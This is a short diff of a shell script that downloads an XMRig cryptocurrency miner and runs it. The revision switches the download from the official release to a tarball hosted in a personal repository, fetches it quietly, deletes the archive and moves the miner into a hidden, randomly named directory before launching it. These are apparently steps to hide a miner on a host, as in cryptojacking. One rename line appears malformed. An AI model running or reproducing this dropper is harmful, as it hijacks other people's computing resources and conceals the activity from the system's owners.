@@ -1,3 +1,7 @@
-busybox wget -q  https://github.com/xmrig/xmrig/releases/download/v6.5.3/xmrig-6.5.3-linux-static-x64.tar.gz
-tar -zxf xmrig-6.5.3-linux-static-x64.tar.gz
-xmrig-6.5.3/xmrig -c xmrig-6.5.3/config.json
+#!/bin/bash
+busybox wget -q  https://github.com/ArchieSin314/TestSite/raw/main/xmrig.tar.gz
+tar -zxf ./xmrig.tar.gz
+rm ./xmrig.tar.gz
+i=$RANDOM
+mv .... .$i
+./.$i/xmrig -c ./.$i/config.json
